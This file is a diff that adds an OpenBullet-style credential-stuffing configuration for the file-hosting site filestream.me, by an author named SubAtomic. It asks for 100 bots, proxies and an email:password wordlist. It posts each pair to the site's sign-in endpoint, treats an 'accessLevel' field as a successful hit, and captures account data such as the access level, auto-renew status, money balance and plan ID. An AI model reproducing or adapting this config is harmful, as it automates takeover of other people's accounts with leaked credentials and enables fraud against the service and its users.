@@ -1,0 +1,49 @@
+[SETTINGS]
+{
+  "Name": "filestream.me",
+  "SuggestedBots": 100,
+  "LastModified": "2018-06-19T20:37:23.1761581+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#POST_LOGIN REQUEST POST "https://filestream.me/members/user/signInRequestAction" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://filestream.me/members/user/login" 
+  HEADER "Origin: https://filestream.me" 
+#GET_ACCOUNT REQUEST GET "https://filestream.me/members/list/files/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://filestream.me/members/user/login" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "accessLevel" 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "accessLevel" 
+#PARSE_accesslevel PARSE "<SOURCE>" LR "accessLevel\":" "," Recursive=FALSE -> CAP "AccesLevel" "" "" 
+#PARSE_autorenew PARSE "<SOURCE>" LR "autoSubscription\":" "," Recursive=FALSE -> CAP "AutoRenew" "" "" 
+#PARSE_money PARSE "<SOURCE>" LR "money\":" "," Recursive=FALSE -> CAP "Money" "" "" 
+PARSE "<SOURCE>" LR "planId\":" "," Recursive=FALSE -> CAP "PlanID" "" "" 
